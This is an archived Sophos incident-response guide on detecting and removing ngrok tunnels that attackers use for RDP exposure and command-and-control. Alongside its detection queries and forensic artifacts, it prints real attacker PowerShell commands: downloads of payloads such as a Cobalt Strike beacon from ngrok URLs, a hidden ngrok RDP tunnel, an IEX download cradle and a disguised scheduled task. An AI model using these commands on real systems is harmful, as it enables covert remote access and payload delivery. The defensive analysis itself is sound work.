{
    "id": "3202dfbf-68fd-4fb9-96e1-f1e524b4dd2c",
    "created_at": "2023-01-12T15:02:00.436905Z",
    "updated_at": "2025-03-27T02:09:18.621611Z",
    "deleted_at": null,
    "sha1_hash": "a2a2e962f690963909123912bbde61c7c67d6654",
    "title": "2022-07-14 - Rapid Response- The Ngrok Incident Guide",
    "authors": "",
    "file_creation_date": "2022-08-18T03:25:53Z",
    "file_modification_date": "2022-08-18T03:25:53Z",
    "file_size": 2088101,
    "plain_text": "# Rapid Response: The Ngrok Incident Guide\n\n**news.sophos.com/en-us/2022/07/14/rapid-response-the-ngrok-incident-guide/**\n\nAlexander Giles July 14, 2022\n\n_This article is part of a series of step-by-step incident guides created by the Sophos Rapid Response team to help incident_\n_responders and security-operations teams identify and remediate widely seen threat tools, techniques, and behaviors._\n\n**What Is Ngrok and How Is It Used by Threat Actors?**\n\nNgrok is a cross-platform tool that exposes local network ports to the internet via secure tunneling. It provides secure tunnels\nbetween the internet and computer systems that exist behind a firewall or Network Access Translation (NAT) solution, and\nwhich use the Transmission Control Protocol (TCP). Once a port has been chosen as the desired communication channel, the\nnecessary tunneling configurations are set up within the ngrok process. Ngrok’s cloud services facilitate two-way network\ntraffic that is relayed back to the running ngrok process and forwards the network traffic to the specified local port.\n\n[A limited version of the tool is freely available at ngrok.com for noncommercial use, and a fuller-fledged version can be](https://ngrok.com/)\nlicensed for commercial use. Unfortunately, it also figures into various attack strategies when malicious actors use its\ntunneling capabilities to connect to command-and-control (C2) servers, download malicious code, and so forth while\nbypassing network protections.\n\nOther likely reasons for its popularity with attackers include:\n\nUsed for legitimate business reasons, which means it is not classed as malware by default\nOperates over common open ports\nNo direct file dependencies\nEasily configured\nSupports any network service that uses the TCP protocol\nAccommodates the creation of TCP tunnels, coupled with the basic access of exposing local ports (3389) for access\nacross an internet connection\n\n\n-----\n\nEnables adversaries to retrieve payloads through public ngrok services (since all the network traffic passes through\nngrok URLs)\n\n**Incident Guide Context**\n\nThis guide only addresses the investigation and mitigation of incidents involving the detection of ngrok on the network. We\n_strongly recommend that responders ascertain whether ngrok is in use on their network for legitimate purposes before_\n_proceeding with mitigation._\n\nThe guide uses features of [Sophos XDR, such as Live Discover and Live Response, to illustrate the steps defenders can](https://www.sophos.com/en-us/products/endpoint-antivirus/xdr)\ntake. Security professionals that are not using Sophos XDR but have access to other tools such as [OSQuery can adapt and](https://osquery.io/)\napply the information to their needs.\n\nQueries and commands referenced in the guide are some of the methods used by the [Sophos Rapid Response team during](https://www.sophos.com/en-us/products/managed-threat-response/rapid-response)\nincident engagements. They are recommendations only; there will be other ways of accomplishing each task.\n\nAny instructions to remove items should be double-checked to prevent the accidental removal of legitimate client\nconfigurations.\n\n## Investigate\n\nThe goal of this section is to establish if there are any Indicators of Compromise (IOC) on the affected system that are related\nto ngrok. In subsequent sections we will provide steps to analyze and respond to the results of investigation. For purposes of\nillustration, we will draw on two separate response scenarios in these sections. We will occasionally use green text to draw\nattention to significant details.\n\n**Check for Live Processes**\n\nFirst, run a query on the network to check the currently running processes.\n\nSophos XDR customers can create and run new Live Discover queries to do this. If you are new to Live Discover, the help\nguide can assist you in putting those together. The basic steps are as follows:\n\n1. Login to Sophos Central, then go to Threat Analysis Center > Live Discover\n2. Enable “Designer Mode”\n3. Select “Create new query”\n4. Give your query a name and description and select a category under which to store it. Be sure to select “Live Endpoint”\n[5. Copy the SQL details from the Rapid Response GitHub page: Process.01.0 – List running processes tool.txt](https://github.com/SophosRapidResponse/OSQuery/blob/main/Process/Process.01.0%20-%20List%20running%20processes.txt)\n6. Save the query\n\n**Live processes**\n\nngrok.exe\n\nngrok runs at the command-line level; potential parent processes include:\n\nCMD.exe\nPowerShell.exe\nCMDline parameters\n\nCMDline parameters\n\nRDP TCP 3389 tunnel\n\n**ngrok.exe tcp 3389**\nHTTP 443\n\n**ngrok http 443**\n\nIn our example, we ran some queries on DNS, HTTP, and PowerShell checking for any signs of ngrok. These are presented\nhere along with the findings.\n\n\n-----\n\n**Journal testing: Downloaded IP Scanner payload via ngrok**\n\nCommand invoked on the target computer\n\npowershell.exe /c (new-object System.Net.WebClient).DownloadFile(‘https://3812\n[redacted].ngrok.io/Advanced_IP_Scanner_2.5.3850.exe’,’C:\\Perflogs\\IP.exe’)\n\n**https://3812-[redacted].ngrok.io > ngrok tunnel setup on the source computer (emulated attackers**\ncommand & control) that points to C:\\Perflogs\\Advanced_IP_Scanner_2.5.3850.exe\n**Advanced_IP_Scanner_2.5.3850.exe > Payload on the source computer**\n**C:\\Perflogs\\IP.exe > Location to write the file to disk on the target computer**\n**DNS Journal**\n\n**Finding > 3812-[redacted]ngrok.io**\n\n**Dynamic (if using free version) > 3812-[redacted]**\n**Static variable > ngrok**\n**Query > Sophos_dns_journal**\n\nName\n\n%ngrok%\n**HTTP Journal**\n\nFinding > No finding due to the tunnel operating over port 443 and not 80\n\n**Query > Sophos_HTTP_Journal**\n**Finding (Changed tunnel to port 80) > c5a8-**\n\n[redacted].ngrok.io/Advanced_IP_Scanner_2.5.3850.exe\n“GET /Advanced_IP_Scanner_2.5.3850.exe HTTP/1.1 Host: c5a8-[redacted].ngrok.io\nConnection: Keep-Alive”\n**Static variable > ngrok**\nQuery > Sophos_http_journal\n\nURL\n\n%ngrok%\nHeader\n\n%ngrok%\n**Grep PSReadline**\n\n**Finding > powershell.exe /c (new-object System.Net.WebClient).DownloadFile(‘https://3812-**\n\n[redacted].ngrok.io/Advanced_IP_Scanner_2.5.3850.exe’,’C:\\Perflogs\\IP.exe’)\n**Static grep pattern > ‘ngrok‘**\n**Query custom** **>**\n\nSELECT grep.*\n\nFROM file\n\nCROSS JOIN grep ON (grep.path = file.path)\n\nWHERE\n\nfile.path LIKE\n‘C:\\Users\\%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt’\nAND grep.pattern = ‘ngrok’\n**Sophos PowerShell events**\n\n**Finding > powershell.exe /c (new-object System.Net.WebClient).DownloadFile(‘https://3812-**\n\n[redacted].ngrok.io/Advanced_IP_Scanner_2.5.3850.exe’,’C:\\Perflogs\\IP.exe’)\n**Static variable > ngrok**\n**Query > sophos_powershell_events**\n\nscript_text\n\n%ngrok%\n**File.01.0 – Files on disk (path)**\n\n**Finding > ngrok YML file which contains auth token (default location when parsed to ngrok.exe)**\n**Static variable > ngrok.yml**\n**Query > $$path$$ > C:\\users\\%\\.ngrok2\\ngrok.yml**\n\nMoving on, we start to dig deeper in DNS, Journals, and other logged data. These options are presented here along with the\nfindings.\n\n\n-----\n\n**Journal testing: Creating port binding 3389 for RDP via ngrok**\n\n\n-----\n\nCommand invoked on the target computer\n\npowershell.exe /c Start-Process -WindowStyle Hidden -FilePath ngrok.exe -ArgumentList ‘tcp 3389’\n\nPowerShell executes the ngrok application and binds the TCP port 3389 (file path assumes ngrok\nbinary is within %system32%), hiding windows, and closing the terminal once the command has\ncompleted\n**DNS Journal**\n\n**Finding > tunnel.us.ngrok.com**\n\n**Static variable > ngrok**\n**Query > Sophos_dns_journal**\n\nName\n\n%grok%\n**Network Journal**\n\n**Finding > Source ::1 | Destination ::1 | DestinationPort 3389**\n\n**Static variable > ::1 | 3389**\n**Query > Sophos_network_journal**\n\nSource\n\n::1\nDestination\n\n::1\nDestination port\n\n3389\n**File journal**\n\n**Finding > C:\\Users\\unknown\\.ngrok2\\ngrok.yml**\n\n**Static variable > ngrok.yml**\n**Query > Sophos_file_journal**\n\nsubject\n\nFileOtherReads\npath\n\n%ngrok.yml\n**File.01.0 – Files on disk (path)**\n\n**Finding > Prefetch execution entry for ngrok created via svchost process**\n**Static variable > NGROK.EXE%.pf**\n**Query > $$path$$ > C:\\Windows\\Prefetch\\NGROK.EXE%.pf**\n**Process Journal**\n\n**Finding > PowerShell.exe” /c Start-Process -WindowStyle Hidden -FilePath ngrok.exe -ArgumentList**\n‘tcp 3389’\n\n**Static variables > ngrok | tcp 3389**\n**Query > Sophos_process_journal**\n\nCMDLine\n\nngrok\ntcp 3389\n**Finding > “C:\\Windows\\system32\\ngrok.exe” tcp 3389**\n\n**Static variables > ngrok | tcp 3889**\n**Query > Sophos_process_journal**\n\nCMDLine\n\nngrok\ntcp 3389\n**Windows Event Logs (Microsoft-Windows-TerminalServices-**\nRemoteConnectionManager%4Operational.evtx)\n\n**Finding > Source Network Address: ::%16777216**\n\n**Static variable > ::%16777216**\n**Query > Rapid Response: Logins.01.0 – 1149 RDP Logins**\n\nSource IP\n\n%::%16777216%\n\n\n-----\n\n**Windows Event Logs (Microsoft Windows TerminalServices LocalSessionManager%4Operational.evtx)**\n\n**Finding > Source Network Address: ::%16777216**\n\n**Static variable > ::%16777216**\n**Query > Rapid Response: Logins.01.2 – 21-40 local session login events**\n\nSource IP\n\n%::%16777216%\n**Windows Event Logs (Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx)**\n\n**Finding > The server accepted a new TCP connection from client [::1]:51154**\n\n**Static variable > ::1**\n**Query > Unknown**\n**New IoC discovery**\n\nScheduled task located that binds a pre-defined ngrok URL via TCP protocol using port 3389\n\n**Task name > MicrosoftSync**\n**Task action > C:\\Windows\\Temp\\rk\\ngrok.exe**\n**Task argument > tcp –region=us –remote-addr=3.tcp.ngrok.io:25126 3389**\n**Execute ngrok > C:\\Windows\\Temp\\rk\\ngrok.exe**\n**Protocol to use > TCP**\n**Region select > us**\n**Remote address > 3.tcp.ngrok.io:25126 3389**\n\nURL > 3.tcp.ngrok.io\nPort > 25126\nProtocol > 3389\n**Task path > C:\\Windows\\system32\\tasks\\Microsoft\\Windows\\MicrosoftSync.xml**\n**Tasks.01.0 – Scheduled Tasks**\n\n**Finding > Scheduled task containing action argument parameters parsed to ngrok binary to start a**\n3389 tunnel via a predefined binding address\n\n**Static variable > %ngrok%**\n\nIf a remote address was supplied within argument parameters within a scheduled task, the\nstatic part that could be searched for would be the second-level domain, which is ngrok\n\n3.tcp.ngrok.io:25126 3389\n\n3 > dynamic value\ntcp > static although doesn’t attribute to ngrok\nngrok > static value for second-level domain to use ngrok public services\nio > static value at present\n25126 > Dynamic / unknown static value (different tiering options)\n3389 > Dynamic value (other ports could be bound)\n%\n$$action$$\n\n**%ngrok%**\n\n## Analyze\n\nThe following information is based on intelligence gathered during two incident response investigations in which ngrok was\nintroduced to the targeted network and abused by attackers.\n\nIncident One\n\n\n-----\n\nRDP connections\n\nSource network address: ::%16777216\nThe server accepted a new TCP connection from client [::1]:52423\nPowerShell downloads ngrok archive file, extracts to disk, and starts the ngrok process via PowerShell\n\npowershell.exe /c (New-Object\nSystem.Net.WebClient).DownloadFile(‘https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows386.zip’,’ngrok.zip’);Expand-Archive -Path ‘ngrok.zip’ –DestinationPath ‘C:\\Windows\\System32\\‘;StartProcess –nnw –FilePath ngrok.exe –ArgumentList version EngineVersion=\nPowerShell invoking ngrok and adding TCP port bind to 3389\n\npowershell.exe /c Start-Process -WindowStyle Hidden -FilePath ngrok.exe -ArgumentList ‘tcp 3389’\n\nPowerShell executes ngrok binary file and sets up TCP port on 3389\nPowerShell invokes ngrok API, using present port 4040\n\npowershell.exe /c (New-Object\nSystem.Net.WebClient).DownloadString(‘http://127.0.0.1:4040/api/tunnels’)\nPowerShell invokes ngrok to communicate to a C2 server to retrieve malicious payload and write to disk\n\npowershell.exe /c (new-object\nSystem.Net.WebClient).DownloadFile(‘http://2f65dfe21ccb.ngrok.io/b3.exe’,’C:\\tmp\\beacon.exe’)\n\nPowerShell invokes web request for file retrieval\n\nhttp > Over web protocol 80\n2f65dfe21ccb > subdomain assigned by ngrok service (with paid versions this can remain\nstatic and not dynamic)\nngrok > second-level domain for ngrok service\n.io > Top-level domain\nb3.exe > Payload to retrieve from attacker’s webserver via ngrok\nC:\\tmp\\beacon > Write b3.exe to disk within this location\n\nBased on the name only, this is a form of beacon\n\n\nIncident Two\n\n\n-----\n\nWget invokes a web request to download an archive file containing an ngrok binary and performs an archive\ndecompress. (Note: This was decoded from base64 SQB…. Code)\n\nIEX (New-Object Net.Webclient).DownloadString(‘http://127.0.0.1:37448/’);\n\n[Net.ServicePointManager]::SecurityProtocol = “tls12, tls11, tls”;\n\n[Net.ServicePointManager]::SecurityProtocol =\n\n[Net.SecurityProtocolType]::Tls12 -bor\n\n[Net.SecurityProtocolType]::Tls11 -bor\n\n[Net.SecurityProtocolType]::Tls ; wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windowsamd64.zip -Outfile C:\\Windows\\Temp\\s.zip ; Expand-Archive -Path C:\\Windows\\Temp\\s.zip DestinationPath C:\\Windows\\Temp\\rk\\\nCobalt Strike local host port Beacon bind assignment\nTLS versions covered to allow download operation to occur for whichever TLS version is present\nWeb request to equinox.io domain to download ngrok\n\nngrok-stable-windows-amd64.zip\nOutput the archive file to disk at location:\n\nC:\\Windows\\Temp\nName the archive file s.zip\nDecompress the archive file to:\n\nC:\\Windows\\Temp\\rk\nScheduled task located which binds a pre-defined ngrok URL via the TCP protocol using port 3389\n\n**Task name > MicrosoftSync**\n**Task action > C:\\Windows\\Temp\\rk\\ngrok.exe**\n**Task argument > tcp –region=us –remote-addr=3.tcp.ngrok.io:25126 3389**\n\n**Execute ngrok > C:\\Windows\\Temp\\rk\\ngrok.exe**\n**Protocol to use > TCP**\n**Region select > us**\n**Remote address > 3.tcp.ngrok.io:25126 3389**\n\nURL > 3.tcp.ngrok.io\nPort > 25126\nProtocol > 3389\n**Task path > C:\\Windows\\system32\\tasks\\Microsoft\\Windows\\MicrosoftSync.xml**\n\nHere, ngrok artifacts (based on ngrok TCP 3389 binding and payload retrieval via web protocols) were found. These are listed\nbelow along with their location. Values shown in green represent data that could be used to suggest ngrok presence / activity.\n\n**File system**\n\n**C:\\Users\\%\\.ngrok2\\ngrok.yml**\n\nThis is the default location created by ngrok regarding the auth token import\n\nngrok.yml contents > authotoken:2x51DsQKXfh5ktnL0QZoE02nP7V_378snElWViOptKDsXk8sM\n**C:\\Windows\\Prefetch\\NGROK.EXE%.pf**\n\nSvchost.exe created a prefetch file when ngrok was executed via a PowerShell start process\n**Registry**\n\nSYSTEM HVE\n\nHKLM\\SYSTEM\\ControlSet001\\Control\\Session Manager\\AppCompatCache\n\nCache entry value > C:\\Users\\unknown\\Desktop\\ngrok.exe\n\nNote:\n\nIf the binary name for ngrok didn’t use the default naming string for the binary executable\n**ngrok.exe, it would render this artifact inconsequential, since the random substitute name**\nthat ngrok would be given by adversaries would not match\nThis artifact can suggest several different types of events have occurred, and is not a\nreliable source for execution date / time stamps. However, if the default naming convention\nremains in use, this artifact could suggest the presence of ngrok\nDefault inherent value will provide last modification time stamp for the binary executable\n\n\n-----\n\n**Windows event logs**\n\n**Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx**\n\nEvent ID 1149\n\nSource Network Address: ::%16777216\nMicrosoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx\n\nEvent ID 21 (Logon succeeded)\n\nSource Network Address: ::%16777216\n\nNote: This event ID will only populate if an RDP connection is established via user credentials\nthat differ from any currently logged on users with sessions\nEvent ID 22 (Shell start notification)\n\nSource Network Address: ::%16777216\n\nNote: This event ID will only populate if an RDP connection is established via user credentials\nthat differ from any currently logged on users with sessions\nEvent ID 24 (Session has been disconnected)\n\nSource Network Address: ::%16777216\nEvent ID 25 (Session reconnection succeeded)\n\nSource Network Address: ::%16777216\n\nNote: This event ID will only populate if an RDP connection is established via user credentials\nthat are currently logged on users with sessions, or a continuation from a disconnection via the\nsame session’s ID\n**Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx**\n\nEvent ID 131 (The server accepted a new TCP connection from client)\n\nThe server accepted a new TCP connection from client [::1]:53645 (53645 represents a private port\nvalue assigned for the connection; this would be a non-static value)\n**Security.evtx**\n\nEvent ID 4624 (account was successfully logged on)\n\nSource Network Address: ::1\n\nNote: ::1 > IPV6 loopback address\nLogon Type: 10 (RDP)\n\nNote: The two variables combined suggest an RDP logon-type connection has occurred, via\na source address, loopback\n\n## Respond\n\nNow that we have information derived from investigation and analysis, we can respond to an unwanted instance of ngrok and\nclean up the network/endpoints, using Sophos Central (or other installed security solution and policies) to block the\napplication. There are various ways to accomplish this.\n\nSophos Central has a global block list by hash (although only versions of ngrok that have hashes added would be blocked).\n\nMicrosoft AppLocker policies / rule sets concerning unsigned binaries can also be put in place to counter this, since the ngrok\nbinary is currently not digitally signed.\n\nMitigation can also be handled at the proxy servers or firewalls (if reviewing DNS requests / TLS decryption packet\ninspection). Although ngrok binaries can differ in name, hash, location, and so forth, the initial network communications to use\nngrok’s public infrastructure appear to be static. For example:\n\nTop-level domain > .io\nSecond-level domain > ngrok\n\nThis second-level domain remains static and could be used to block network traffic\nSubdomain > Random if using a free versions; other tiering allows for static domains\n\nLikewise, for DNS requests, a similar approach could be adopted to block ngrok traffic and identify which machines were\ninitiating the DNS requests. Note that as shown in various instances above, ngrok uses multiple top-level domains (.com, .io):\n\n\n-----\n\nTop level domain > .com\nSecond-level domain > ngrok\n\nThis second-level domain, which in our experience remains static, could be used to detect the network traffic\nrequest from the source host and block the network traffic. Although the subdomains also appear to be\nstatic, the detection / block would be cleaner using the second-level ngrok value, in case different regions\nwere to provide alternate subdomains or some other form of differences\nSubdomains > tunnel.US\n\nBefore restoring from backup, remember to check that your backups are also clean.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-14 - Rapid Response- The Ngrok Incident Guide.pdf"
    ],
    "report_names": [
        "2022-07-14 - Rapid Response- The Ngrok Incident Guide.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535720,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1660793153,
    "ts_modification_date": 1660793153,
    "files": {
        "pdf": "https://archive.orkl.eu/a2a2e962f690963909123912bbde61c7c67d6654.pdf",
        "text": "https://archive.orkl.eu/a2a2e962f690963909123912bbde61c7c67d6654.txt",
        "img": "https://archive.orkl.eu/a2a2e962f690963909123912bbde61c7c67d6654.jpg"
    }
}